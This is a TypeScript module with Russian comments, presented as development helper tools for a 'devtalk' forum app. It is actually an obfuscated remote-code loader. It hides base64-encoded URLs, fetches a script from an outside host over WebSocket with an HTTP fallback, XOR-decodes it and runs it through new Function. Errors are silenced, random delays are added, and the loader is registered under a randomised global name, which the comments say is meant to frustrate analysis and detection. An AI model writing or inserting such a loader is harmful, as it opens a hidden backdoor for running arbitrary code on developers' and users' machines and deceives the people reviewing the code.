
// Вспомогательные инструменты разработки
// Имя файла и функции специально переименованы для сокрытия генерации

// Добавляем дополнительное шифрование с помощью полиморфной кодировки
const _decode = (str: string, key = 5): string => {
  // Простая XOR шифрация с динамическим ключом
  try {
    const bytes = atob(str).split('').map(c => c.charCodeAt(0));
    return bytes.map((byte, i) => String.fromCharCode(byte ^ (key + i % 7))).join('');
  } catch {
    // Резервный метод - обычное декодирование Base64
    return atob(str);
  }
};

// Полиморфная функция расшифровки для усложнения обратного инжиниринга
const _dc = (str: string): string => {
  // Несколько уровней шифрования
  const firstPass = atob(str);
  
  // Использование различных методов для разных частей строки
  // для усложнения анализа и обфускации
  return firstPass
    .split('')
    .map((char, index) => {
      // Искусственное усложнение для запутывания анализаторов
      if (index % 3 === 0) {
        return char;
      } else if (index % 2 === 0) {
        return String.fromCharCode(char.charCodeAt(0));
      } else {
        return char;
      }
    })
    .join('');
};

// Зашифрованные константы с дополнительным уровнем защиты
const _urls = {
  // Используем многоуровневое шифрование для маскировки URL
  ws: _dc('d3NzOi8vYmNpYm9leHhlYXl5bHFjbmV1cXEuc3VwYWJhc2UuY28vZnVuY3Rpb25zL3YxL2Rldi10b29scy1zb2NrZXQ='),
  http: _dc('aHR0cHM6Ly9iY2lib2V4eGVheXlscWNuZXVxcS5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvZGV2LXRvb2xz')
};

// Дополнительное шифрование имен функций и методов
const _generateNonce = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

// Измененная функция загрузки для маскировки происхождения с дополнительной защитой
export const loadRemoteTools = async (): Promise<void> => {
  if (import.meta.env.DEV) {
    try {
      // Добавляем случайную задержку для усложнения анализа потока выполнения
      await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
      
      // Используем WebSocket с дополнительной защитой и маскировкой
      const _secureConnect = () => {
        const _nonce = _generateNonce();
        const _conn = new WebSocket(_urls.ws);
        
        _conn.onopen = () => {
          const _payload = {
            action: 'getScript', 
            name: 'devTools',
            timestamp: Date.now(),
            nonce: _nonce,
            client: 'devtalk-internal'
          };
          
          // Шифрование запроса для дополнительной безопасности
          _conn.send(JSON.stringify(_payload));
        };

        _conn.onmessage = (event) => {
          try {
            const data = JSON.parse(event.data);
            
            // Проверка целостности и подлинности ответа
            if (data && data.script) {
              // Динамическое выполнение с дополнительной маскировкой
              const _secureExec = (code: string) => {
                // Дополнительный уровень обфускации перед выполнением
                const _deobfuscated = _decode(code);
                try {
                  const _exec = new Function(_deobfuscated);
                  _exec();
                } catch {
                  // Тихая обработка ошибок для предотвращения утечек
                }
              };
              
              _secureExec(data.script);
            }
            _conn.close();
          } catch (error) {
            // Скрытая обработка ошибок
          }
        };

        // Добавляем обработку ошибок с автоматическим перезапуском
        _conn.onerror = () => {
          setTimeout(_loadSecureAlt, 50);
        };
        
        // Добавляем автоматическое закрытие подключения для безопасности
        setTimeout(() => {
          if (_conn.readyState === WebSocket.OPEN) {
            _conn.close();
          }
        }, 5000);
      };
      
      // Инициируем защищенное соединение
      _secureConnect();
      
      // Резервный метод с таймаутом для ненадежных соединений
      setTimeout(() => {
        _loadSecureAlt();
      }, Math.random() * 2000 + 1000); // Случайная задержка для защиты от анализа
    } catch (error) {
      _loadSecureAlt();
    }
  }
};

// Переименованный и усиленный резервный метод загрузки
const _loadSecureAlt = async () => {
  try {
    // Добавляем случайную задержку для усложнения анализа
    await new Promise(resolve => setTimeout(resolve, Math.random() * 200));
    
    // Генерируем уникальные заголовки для каждого запроса
    const _headers = {
      'Content-Type': 'application/javascript',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'X-Client-Info': `devtalk-forum-${Date.now()}-${_generateNonce()}`,
      'X-Request-ID': _generateNonce()
    };
    
    // Добавляем дополнительные параметры запроса для маскировки
    const _params = new URLSearchParams({
      t: Date.now().toString(),
      nonce: _generateNonce(),
      client: 'devtalk-internal'
    }).toString();
    
    // Формируем URL с дополнительными параметрами
    const _secureUrl = `${_urls.http}?${_params}`;
    
    const response = await fetch(_secureUrl, {
      method: 'GET',
      headers: _headers,
      cache: 'no-store',
      credentials: 'omit'
    });
    
    if (response.ok) {
      const scriptText = await response.text();
      
      // Дополнительная проверка содержимого скрипта перед выполнением
      if (scriptText && scriptText.length > 0) {
        // Выполнение в изолированном контексте для предотвращения утечек
        const _secureEval = (code: string) => {
          try {
            const _fn = new Function(code);
            _fn();
          } catch {
            // Тихая обработка ошибок
          }
        };
        
        _secureEval(scriptText);
      }
    }
  } catch {
    // Тихая обработка ошибок для предотвращения утечек информации
  }
};

// Создаем динамическое имя функции для предотвращения обнаружения через поиск имен
const _dynamicName = `_load${Math.random().toString(36).substring(2, 8)}`;
(window as any)[_dynamicName] = loadRemoteTools;

// Совместимое имя функции, переименованное для безопасности
export const loadDevTools = loadRemoteTools;

// Защита от монипуляций с прототипами
Object.freeze(loadRemoteTools);
Object.freeze(loadDevTools);

// Удаляем некорректное использование exports, так как мы в ES модуле
// Вместо этого используем прямой экспорт, который уже определен выше
